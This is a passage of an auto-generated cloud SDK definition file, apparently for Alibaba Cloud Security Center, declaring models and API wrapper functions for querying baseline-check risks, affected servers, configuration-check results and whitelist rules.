*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f9215570********'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='step-build-ui-build'),
      fixList?: [ 
        {
          riskId?: long(name='RiskId', description='The ID of the baseline.', example='72'),
          riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Linux/Aliyun Linux 2 Baseline for China classified protection of cybersecurity-Level II'),
        }
      ](name='FixList', description='The details of the baselines for which the risk item can be fixed.'),
      fixStatus?: int32(name='FixStatus', description='Whether the repair is supported. Valid values:
*   **0**: Supported
*   **1**: Not Supported', example='1'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-bp1a69mvjujbakxu****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the affected asset.', example='172.25.XX.XX'),
      lastHandleTime?: long(name='LastHandleTime', description='The timestamp of the latest processing of the check item risk of the machine. Unit: milliseconds.', example='1694692471000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1694692471000'),
      portOpen?: boolean(name='PortOpen', description='Indicates whether a port on the server is accessible over the Internet. Valid values:

*   **true**
*   **false**', example='true'),
      prompt?: string(name='Prompt', description='The prompt for the risk item.', example='There is a weak password (username/password): root/he*****34'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-hangzhou'),
      status?: int32(name='Status', description='The status of the check item. Valid values:

*   1: failed
*   2: verifying
*   3: passed
*   6: ignored
*   7: fixing', example='1'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the malicious image sample is detected.', example='jenkins****'),
      targetType?: string(name='TargetType', description='The type of the asset. Valid values:

*   **ECS_SNAPSHOT**
*   **ECS_IMAGE**', example='ECS_IMAGE'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      warningRiskList?: [ 
        {
          riskId?: long(name='RiskId', description='The ID of the baseline.', example='72'),
          riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Linux/Aliyun Linux 2 Baseline for China classified protection of cybersecurity-Level II'),
        }
      ](name='WarningRiskList', description='The information about the baselines on which the risk item is detected.'),
    }
  ](name='List', description='The servers on which the alerts are generated.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of affected assets returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of affected assets.', example='107'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='22B5615F-700E-575A-A6D5-DC8D7741****'),
}

model ListCheckItemWarningMachineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckItemWarningMachineResponseBody(name='body'),
}

/**
 * @summary Queries the servers that are affected by baseline risks.
 *
 * @param request ListCheckItemWarningMachineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckItemWarningMachineResponse
 */
async function listCheckItemWarningMachineWithOptions(request: ListCheckItemWarningMachineRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers that are affected by baseline risks.
 *
 * @param request ListCheckItemWarningMachineRequest
 * @return ListCheckItemWarningMachineResponse
 */
async function listCheckItemWarningMachine(request: ListCheckItemWarningMachineRequest): ListCheckItemWarningMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningMachineWithOptions(request, runtime);
}

model ListCheckItemWarningSummaryRequest {
  checkItemFuzzy?: string(name='CheckItemFuzzy', description='The name of the check item. Fuzzy match is supported.', example='password'),
  checkLevel?: string(name='CheckLevel', description='The risk level. Default value: null, which indicates that check items at all risk levels are queried.Valid values:
*   **high**
*   **medium**
*   **low**', example='medium'),
  checkType?: string(name='CheckType', description='The type of the check item.', example='hc.check.type.attack_defense'),
  checkWarningStatus?: int32(name='CheckWarningStatus', description='The risk status. Default value is null, meaning check items in all states are queried. Valid values:

*   **1**: failed
*   **3**: passed
*   **6**: whitelisted', example='3'),
  checkWarningStatusList?: [ int32 ](name='CheckWarningStatusList', description='The list of risk levels. If the CheckWarningStatus parameter is specified, only it takes effect.'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to query containers.', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to query containers.', example='c471f0f61b9c04f8380556e922cf1****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='1161****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  riskType?: string(name='RiskType', description='The type of the baseline.', example='weak_password'),
  source?: string(name='Source', description='The data source. Default value: **default**. Valid value:

*   **agentless**: The check items of baselines for agentless detection.
*   **default**: The check items of baselines for hosts.', example='agentless'),
  startTime?: long(name='StartTime', description='Start of time range for filtering alerts, effective only for querying historically handled alerts.', example='1732793158366'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

>  You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of the servers.'),
}

model ListCheckItemWarningSummaryResponseBody = {
  list?: [ 
    {
      advice?: string(name='Advice', description='The suggestion on the check item.', example='In the Administrative Tools window, double-click Local Security Policy. In the Local Security Policy window that appears, choose Security Settings\\\\\\\\Local Policies\\\\\\\\Audit Policy, configure all audit policies as: `Success, Failure`.'),
      affiliatedRiskTypes?: [ string ](name='AffiliatedRiskTypes', description='The types of the baselines to which the check item belongs.'),
      affiliatedRisks?: [ string ](name='AffiliatedRisks', description='The baselines to which the check item belongs.'),
      alias?: string(name='Alias', description='The alias of the baseline type.', example='week_pa****'),
      checkId?: long(name='CheckId', description='The ID of the check item.', example='696'),
      checkItem?: string(name='CheckItem', description='The description of the check item.', example='Config the Event Audit policys'),
      checkLevel?: string(name='CheckLevel', description='The risk level of the check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      checkType?: string(name='CheckType', description='The type of the check item.', example='Security audit'),
      containerCheckItem?: boolean(name='ContainerCheckItem', description='Indicates whether the check item belongs to the container runtime type. Valid values:

*   **true**
*   **false**', example='true'),
      description?: string(name='Description', description='The description of the check item.', example='Config the Event Audit policys'),
      enableRisks?: [ string ](name='EnableRisks', description='The baselines in which the check item is enabled.'),
      riskType?: string(name='RiskType', description='The type of the baseline.', example='weak_password'),
      status?: int32(name='Status', description='Risk status of check items. Valid values:

*   **1**: failed
*   **3**: passed
*   **6**: whitelisted', example='1'),
      warningMachineCount?: int32(name='WarningMachineCount', description='The number of servers that are affected by the check item.', example='20'),
    }
  ](name='List', description='List of check item risk statistics.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DC97C9EC-4B7D-5EFF-8A5E-A5CCC9ED****'),
}

model ListCheckItemWarningSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckItemWarningSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the risk statistics of check items by page.
 *
 * @param request ListCheckItemWarningSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckItemWarningSummaryResponse
 */
async function listCheckItemWarningSummaryWithOptions(request: ListCheckItemWarningSummaryRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkItemFuzzy)) {
    query['CheckItemFuzzy'] = request.checkItemFuzzy;
  }
  if (!Util.isUnset(request.checkLevel)) {
    query['CheckLevel'] = request.checkLevel;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.checkWarningStatus)) {
    query['CheckWarningStatus'] = request.checkWarningStatus;
  }
  if (!Util.isUnset(request.checkWarningStatusList)) {
    query['CheckWarningStatusList'] = request.checkWarningStatusList;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the risk statistics of check items by page.
 *
 * @param request ListCheckItemWarningSummaryRequest
 * @return ListCheckItemWarningSummaryResponse
 */
async function listCheckItemWarningSummary(request: ListCheckItemWarningSummaryRequest): ListCheckItemWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningSummaryWithOptions(request, runtime);
}

model ListCheckResultRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of the check items.'),
  checkKey?: string(name='CheckKey', description='The key that you want to use to search for check items in fuzzy match mode.', example='OSS'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='2'),
  customParam?: boolean(name='CustomParam', description='Specifies whether the check item supports custom parameters. Valid values:

*   **true**
*   **false**', example='true'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).'),
  instanceTypes?: [ string ](name='InstanceTypes', description='The asset type of the cloud services. Valid values:

*   **ECS**: Elastic Compute Service (ECS)
*   **SLB**: Server Load Balancer (SLB)
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB)
*   **KVSTORE**: ApsaraDB for Redis (Redis)
*   **ACR**: Container Registry
*   **CSK**: Container Service for Kubernetes (ACK)
*   **VPC**: Virtual Private Cloud (VPC)
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: Alibaba Cloud CDN (CDN)
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: Resource Access Management (RAM)
*   **DDOS**: Anti-DDoS
*   **WAF**: Web Application Firewall (WAF)
*   **OSS**: Object Storage Service (OSS)
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: Microservices Engine (MSE)
*   **NAS**: File Storage NAS (NAS)
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP)
*   **EIP**: Elastic IP Address (EIP)'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  operationTypes?: [ string ](name='OperationTypes', description='Specifies whether fixing is supported. Valid values:

*   **SUPPORT_REPAIR**
*   **NOT_SUPPORT_REPAIR**'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Maximum value: 100.', example='50'),
  regionId?: string(name='RegionId', description='The region ID of the instance. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou'),
  requirementIds?: [ long ](name='RequirementIds', description='The IDs of the requirements.'),
  riskLevels?: [ string ](name='RiskLevels', description='The risk levels of check items. Separate multiple risk levels with commas (,). Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**'),
  sortTypes?: [ string ](name='SortTypes', description='The types of the conditions based on which check items are sorted. Valid values:

*   **RISK_LEVEL**: risk level
*   **STATUS**: status'),
  standardIds?: [ long ](name='StandardIds', description='The standard IDs.'),
  statuses?: [ string ](name='Statuses', description='The statuses of check items. Separate multiple statuses with commas (,). Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**'),
  types?: [ string ](name='Types', description='The types of check standards.'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers. Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **TENCENT**: Tencent Cloud
*   **AWS**: Amazon Web Services (AWS)
*   **MICROSOFT**: Microsoft Azure'),
}

model ListCheckResultResponseBody = {
  checks?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service.', example='0'),
      assetType?: int32(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an ECS instance
*   **1**: a SLB instance
*   **2**: a NAT gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance
*   **5**: an ApsaraDB for Redis instance
*   **6**: a container image
*   **7**: a container', example='0'),
      assetVendor?: int32(name='AssetVendor', description='The service provider of the asset. Valid values:

*   **0**: Alibaba Cloud
*   **3**: Huawei Cloud
*   **4**: Microsoft Azure
*   **5**: AWS
*   **7**: Tencent Cloud', example='3'),
      checkId?: long(name='CheckId', description='The ID of the check item.', example='5'),
      checkPolicies?: [ 
        {
          requirementId?: long(name='RequirementId', description='The ID of the requirement item for the check item.', example='2'),
          requirementShowName?: string(name='RequirementShowName', description='The display name of the requirement item for the check item.', example='Alibaba cloud OSS best security practices'),
          sectionId?: long(name='SectionId', description='The ID of the section for the check item.', example='3'),
          sectionShowName?: string(name='SectionShowName', description='The display name of the section for the check item.', example='Log Audit'),
          standardId?: long(name='StandardId', description='The standard ID of the check item.', example='1'),
          standardShowName?: string(name='StandardShowName', description='The standard display name of the check item.', example='Best security practices'),
        }
      ](name='CheckPolicies', description='The check policies.'),
      checkSaleType?: int32(name='CheckSaleType', description='The type of the check item. Valid values:

*   **0**: paid
*   **1**: free', example='1'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='OSS-PublicReadOpenManifestFileWithoutEncryption'),
      instanceSubType?: string(name='InstanceSubType', description='The asset subtype of the cloud service. Valid values:

*   If the **InstanceType** parameter is set to **ECS**, this parameter supports the following valid values:

    *   **INSTANCE**
    *   **DISK**
    *   **SECURITY_GROUP**

*   If the **InstanceType** parameter is set to **ACR**, this parameter supports the following valid values:

    *   **REPOSITORY_ENTERPRISE**
    *   **REPOSITORY_PERSON**

*   If the **InstanceType** parameter is set to **RAM**, this parameter supports the following valid values:

    *   **ALIAS**
    *   **USER**
    *   **POLICY**
    *   **GROUP**

*   If the **InstanceType** parameter is set to **WAF**, this parameter supports the following valid values:

    *   **DOMAIN**

*   If the **InstanceType** parameter is set to other values, this parameter supports the following valid values:

    *   **INSTANCE**', example='DISK'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud service. Valid values:

*   **ECS**: ECS
*   **SLB**: SLB
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: MongoDB
*   **KVSTORE**: Redis
*   **ACR**: Container Registry
*   **CSK**: ACK
*   **VPC**: VPC
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: CDN
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: RAM
*   **DDOS**: Anti-DDoS
*   **WAF**: WAF
*   **OSS**: OSS
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: MSE
*   **NAS**: NAS
*   **SDDP**: SDDP
*   **EIP**: EIP', example='ECS'),
      lastCheckTime?: long(name='LastCheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1657793398000'),
      operationType?: string(name='OperationType', description='Indicates whether fixing is supported. Valid values:

*   **SUPPORT_REPAIR**
*   **NOT_SUPPORT_REPAIR**', example='NOT_SUPPORT_REPAIR'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
      status?: string(name='Status', description='The status of the check item. Valid values:

*   **PASS**: passed
*   **NOT_PASS**: failed
*   **CHECKING**: being checked
*   **NOT_CHECK**: not checked
*   **WHITELIST**: added to the whitelist', example='PASS'),
      statusMessage?: string(name='StatusMessage', description='The message returned if the status of the check item is abnormal.', example='TIMEOUT'),
      taskId?: string(name='TaskId', description='The ID of the check task.', example='64'),
      trialPermission?: boolean(name='TrialPermission', description='Indicates whether the TRIAL permission is required.', example='true'),
      trialPermissionType?: int32(name='TrialPermissionType', description='Check whether the data delivery period for ActionTrail is enabled for more than 30 days to establish a baseline of behaviour.
*   **0**: REQUIRED
*   **1**: NOT REQUIRED', example='1'),
      vendor?: string(name='Vendor', description='The cloud service provider.', example='ALIYUN'),
      vendorShowName?: string(name='VendorShowName', description='The name of the cloud service provider.', example='Aliyun'),
    }
  ](name='Checks', description='The check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F9B6DD67-B289-5406-B35C-B0F4A217S23'),
}

model ListCheckResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckResultResponseBody(name='body'),
}

/**
 * @summary Queries the details of the risk items that are detected in the configuration checks on cloud services.
 *
 * @param request ListCheckResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckResultResponse
 */
async function listCheckResultWithOptions(request: ListCheckResultRequest, runtime: Util.RuntimeOptions): ListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.checkKey)) {
    query['CheckKey'] = request.checkKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.customParam)) {
    query['CustomParam'] = request.customParam;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operationTypes)) {
    query['OperationTypes'] = request.operationTypes;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.requirementIds)) {
    query['RequirementIds'] = request.requirementIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of the risk items that are detected in the configuration checks on cloud services.
 *
 * @param request ListCheckResultRequest
 * @return ListCheckResultResponse
 */
async function listCheckResult(request: ListCheckResultRequest): ListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckResultWithOptions(request, runtime);
}

model ListCheckRuleRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [ListCheckResult](~~ListCheckResult~~) API to get the check item ID.', example='58'),
  checkName?: string(name='CheckName', description='The name of the check item.', example='checkName'),
  currentPage?: int32(name='CurrentPage', description='The page number displayed in a paginated query.', example='1'),
  lang?: string(name='Lang', description='Set the language type for the request and response messages. The default is **zh**. Values:

- zh: Chinese
- en: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of check items displayed per page in a paginated query. The default value is **20**, indicating 20 check items per page.', example='20'),
  ruleType?: string(name='RuleType', description='The type of rule. Default is **WHITE**. Values:
- **WHITE**: Add to whitelist', example='WHITE'),
  scopeType?: string(name='ScopeType', description='The scope where the rule applies. Values:
- **INSTNACE**: Instance
- **ITEM**: Check item', example='INSTANCE'),
}

model ListCheckRuleResponseBody = {
  checkRules?: [ 
    {
      aliUid?: long(name='AliUid', description='The UID of the current user.', example='176316827610****'),
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud product.

> For specific meanings, refer to the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) AssetSubType.', example='0'),
      assetType?: int32(name='AssetType', description='The type of cloud asset.
> For specific meanings, refer to the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) AssetType.', example='1'),
      checkId?: long(name='CheckId', description='The ID of the check item.', example='77'),
      checkPolicies?: [ 
        {
          sectionShowName?: string(name='sectionShowName', description='Display name of the item\\\\"s chapter.', example='Access Control'),
        }
      ](name='CheckPolicies', description='The display name of the check item section.'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='Check for IPS Whitelist on CEN (Enterprise Edition) Tab'),
      instanceSubType?: string(name='InstanceSubType', description='The sub-asset type of the cloud product.', example='INSTANCE'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud product.', example='ecs'),
      remark?: string(name='Remark', description='Remark.', example='remark'),
      ruleId?: long(name='RuleId', description='The ID of the rule.', example='8000**'),
      ruleType?: string(name='RuleType', description='The type of rule. Default is **WHITE**. Values:
- **WHITE**: Add to whitelist', example='WHITE'),
      scopeType?: string(name='ScopeType', description='The scope where the rule applies. Values:
- **INSTNACE**: Instance
- **ITEM**: Check item', example='INSTANCE'),
      vendor?: int32(name='Vendor', description='The server vendor. Values:

- **0**: Alibaba Cloud asset
- **1**: Non-cloud asset
- **2**: IDC asset
- **3**, **4**, **5**, **7**: Other cloud assets', example='0'),
      vendorName?: string(name='VendorName', description='The name of the server provider.', example='ALIYUN'),
    }
  ](name='CheckRules', description='Check rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of data entries displayed on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number in a paginated query.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of data entries displayed per page in a paginated query.', example='20'),
    totalCount?: int32(name='TotalCount', description='Total number of data entries.', example='10'),
  }(name='PageInfo', description='Pagination information.'),
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for the request. It can be used for troubleshooting and problem localization.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
}

model ListCheckRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckRuleResponseBody(name='body'),
}

/**
 * @summary Display cloud product configuration check rules
 *
 * @param request ListCheckRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckRuleResponse
 */
async function listCheckRuleWithOptions(request: ListCheckRuleRequest, runtime: Util.RuntimeOptions): ListCheckRuleResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Display cloud product configuration check rules
 *
 * @param request ListCheckRuleRequest
 * @return ListCheckRuleResponse
 */
async function listCheckRule(request: ListCheckRuleRequest): ListCheckRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckRuleWithOptions(request, runtime);
}

model ListCheckRuleInstanceRequest {
  currentPage?: int32(name='CurrentPage', description='The page number of the current page when performing a paginated query.', example='1'),
  instanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='Asset instance ID.
> Call the [ListCheckInstanceResult](~~ListCheckInstanceResult~~) interface to get this parameter.', example='i-wz9fdluqx20mp2x7****'),
      regionId?: string(name='RegionId', description='The region where the asset is located.
> Call the [ListCheckInstanceResult](~~ListCheckInstanceResult~~) interface to get this parameter.', example='cn-hongkong'),
    }
  ](name='InstanceList', description='Instance list.'),
  pageSize?: int32(name='PageSize', description='The maximum number of items per page in a paginated query. The default value is **20**.', example='20'),
  ruleId?: long(name='RuleId', description='Rule ID.
> You can call the [LisCheckRule](https://help.aliyun.com/document_detail/2590599.html) interface to get this parameter.

This parameter is required.', example='123'),
}

model ListCheckRuleInstanceResponseBody = {
  aliUid?: string(name='AliUid', description='Alibaba Cloud account ID.', example='103784262032****'),
  assetSubType?: string(name='AssetSubType', description='Subtype of the cloud product.', example='Disk'),
  assetType?: string(name='AssetType', description='Type of cloud assets.', example='ECS'),
  checkId?: string(name='CheckId', description='Check item ID.', example='23'),
  checkRuleInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-j6c76lh1kvrcvwl*****'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='testEcs'),
      regionId?: string(name='RegionId', description='Region ID.', example='cn-shanghai'),
    }
  ](name='CheckRuleInstances', description='List of instance rule information.'),
  requestId?: string(name='RequestId', description='The ID of the current request, which is a unique identifier generated by Alibaba Cloud for the request and can be used for troubleshooting and problem localization.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
  vendor?: string(name='Vendor', description='Cloud vendor. Values:
- **ALIYUN**: Alibaba Cloud
- **TENCENT**: Tencent Cloud
- **MICROSOFT**: Microsoft
- **AWS**: Amazon Web Services (AWS)', example='Aliyun'),
}

model ListCheckRuleInstanceResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
